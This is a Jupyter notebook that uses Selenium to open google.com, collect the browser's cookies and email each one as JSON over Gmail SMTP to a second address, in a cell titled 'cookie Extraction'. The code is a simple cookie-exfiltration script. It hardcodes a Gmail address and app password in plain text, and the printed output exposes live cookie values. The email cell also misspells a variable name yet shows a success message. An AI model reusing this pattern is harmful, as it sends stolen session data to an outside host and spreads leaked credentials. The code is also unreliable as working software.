{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "919fc6c3-a781-4dfd-8bdb-7c68c5fccb22",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: selenium in c:\\users\\shaur\\appdata\\local\\programs\\python\\python313\\lib\\site-packages (4.27.1)\n",
      "Requirement already satisfied: urllib3<3,>=1.26 in c:\\users\\shaur\\appdata\\local\\programs\\python\\python313\\lib\\site-packages (from urllib3[socks]<3,>=1.26->selenium) (2.2.3)\n",
      "Requirement already satisfied: trio~=0.17 in c:\\users\\shaur\\appdata\\local\\programs\\python\\python313\\lib\\site-packages (from selenium) (0.28.0)\n",
      "Requirement already satisfied: trio-websocket~=0.9 in c:\\users\\shaur\\appdata\\local\\programs\\python\\python313\\lib\\site-packages (from selenium) (0.11.1)\n",
      "Requirement already satisfied: certifi>=2021.10.8 in c:\\users\\shaur\\appdata\\local\\programs\\python\\python313\\lib\\site-packages (from selenium) (2024.12.14)\n",
      "Requirement already satisfied: typing_extensions~=4.9 in c:\\users\\shaur\\appdata\\local\\programs\\python\\python313\\lib\\site-packages (from selenium) (4.12.2)\n",
      "Requirement already satisfied: websocket-client~=1.8 in c:\\users\\shaur\\appdata\\local\\programs\\python\\python313\\lib\\site-packages (from selenium) (1.8.0)\n",
      "Requirement already satisfied: attrs>=23.2.0 in c:\\users\\shaur\\appdata\\local\\programs\\python\\python313\\lib\\site-packages (from trio~=0.17->selenium) (24.3.0)\n",
      "Requirement already satisfied: sortedcontainers in c:\\users\\shaur\\appdata\\local\\programs\\python\\python313\\lib\\site-packages (from trio~=0.17->selenium) (2.4.0)\n",
      "Requirement already satisfied: idna in c:\\users\\shaur\\appdata\\local\\programs\\python\\python313\\lib\\site-packages (from trio~=0.17->selenium) (3.10)\n",
      "Requirement already satisfied: outcome in c:\\users\\shaur\\appdata\\local\\programs\\python\\python313\\lib\\site-packages (from trio~=0.17->selenium) (1.3.0.post0)\n",
      "Requirement already satisfied: sniffio>=1.3.0 in c:\\users\\shaur\\appdata\\local\\programs\\python\\python313\\lib\\site-packages (from trio~=0.17->selenium) (1.3.1)\n",
      "Requirement already satisfied: cffi>=1.14 in c:\\users\\shaur\\appdata\\local\\programs\\python\\python313\\lib\\site-packages (from trio~=0.17->selenium) (1.17.1)\n",
      "Requirement already satisfied: wsproto>=0.14 in c:\\users\\shaur\\appdata\\local\\programs\\python\\python313\\lib\\site-packages (from trio-websocket~=0.9->selenium) (1.2.0)\n",
      "Requirement already satisfied: pysocks!=1.5.7,<2.0,>=1.5.6 in c:\\users\\shaur\\appdata\\local\\programs\\python\\python313\\lib\\site-packages (from urllib3[socks]<3,>=1.26->selenium) (1.7.1)\n",
      "Requirement already satisfied: pycparser in c:\\users\\shaur\\appdata\\local\\programs\\python\\python313\\lib\\site-packages (from cffi>=1.14->trio~=0.17->selenium) (2.22)\n",
      "Requirement already satisfied: h11<1,>=0.9.0 in c:\\users\\shaur\\appdata\\local\\programs\\python\\python313\\lib\\site-packages (from wsproto>=0.14->trio-websocket~=0.9->selenium) (0.14.0)\n",
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    }
   ],
   "source": [
    "pip install selenium"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "cfb24834-27b2-4745-85d5-5012e625a685",
   "metadata": {},
   "outputs": [],
   "source": [
    "from selenium import webdriver\n",
    "import smtplib\n",
    "driver = webdriver.Chrome()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "28d579b5-b8ff-435f-a519-f2db7d4fc392",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(220, b'2.0.0 Ready to start TLS')"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Open the webpage\n",
    "driver.get(\"http://www.google.com\")\n",
    "\n",
    "# Retrieve browser cookies\n",
    "cookies = driver.get_cookies()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "ecc9e30c-315f-40cc-89d1-1e5f4eb07e1b",
   "metadata": {},
   "outputs": [],
   "source": [
    "sender = \"shauravbhandari2@gmail.com\"\n",
    "password = \"gmua tqzn sjrx usyb\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "id": "60862b4a-0ff6-4d94-a0e9-9f070b282546",
   "metadata": {},
   "outputs": [],
   "source": [
    "import json"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bef98dc3-db4d-4b3f-8ea9-527278a4e0ed",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f11c163b-a8f2-4f2d-a3b8-9b00c3e96e16",
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "id": "48287e75-4e66-442e-9542-b09d485c2c90",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{\"domain\": \".google.com\", \"expiry\": 1753171043, \"httpOnly\": true, \"name\": \"NID\", \"path\": \"/\", \"sameSite\": \"None\", \"secure\": true, \"value\": \"520=Iu4m-U0vPN2c275AZbTxGtfkQlNHlNUVtibZQt-PLaNUl68hCo-atnmqE6V8YlYq60aNSTpMxm7kXxJlOq9cviVX7JSp0HPSgnn8ar4uVgoDdjSLD75qAvqcouz_pNJUHq8jK1cVo_ljTYRo5oxERF3vksezS0G9knyS0VWCvToDpIGnuIBsd9eL8opv91oVqnYcQNyZp1kd3NZzmYI1Y1sEx2w3IFY\"}\n",
      "{\"domain\": \".google.com\", \"expiry\": 1752911843, \"httpOnly\": true, \"name\": \"AEC\", \"path\": \"/\", \"sameSite\": \"Lax\", \"secure\": true, \"value\": \"AZ6Zc-W3ifg-Nd6GnB8A2YmLzka0GDTyCRroGm8_tWH4-NSMtfd4LB4OGA\"}\n",
      "Emails sent successfully!\n"
     ]
    }
   ],
   "source": [
    "recipient = \"bhlaxman45@gmail.com\"\n",
    "subject=\"cookie Extraction\"\n",
    "header = f'To: {reciepient}\\nFrom: {sender}\\nSubject: {subject}\\n'\n",
    "\n",
    "with smtplib.SMTP('smtp.gmail.com', 587) as mail:\n",
    "    mail.starttls()  # Encrypt the connection\n",
    "    mail.login(sender, password)  # Log in with the app password\n",
    "    \n",
    "    for cookie in cookies:\n",
    "        # Serialize the cookie dictionary into a string\n",
    "        cookie_str = json.dumps(cookie)\n",
    "        print(cookie_str)\n",
    "        content = header + cookie_str + \"\\n\"\n",
    "        mail.sendmail(sender, recipient, content)\n",
    "\n",
    "    print(\"Emails sent successfully!\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "fe332790-d802-454b-9f90-c64786c2d827",
   "metadata": {},
   "outputs": [],
   "source": [
    "driver.quit()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "30522921-fc47-48cd-800d-ea8c6f988117",
   "metadata": {},
   "outputs": [],
   "source": [
    "mail.quit()"
   ]
  },
  {
   "cell_type": "raw",
   "id": "4f324128-c3bf-4a11-9637-7a4e82496ed6",
   "metadata": {},
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.13.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
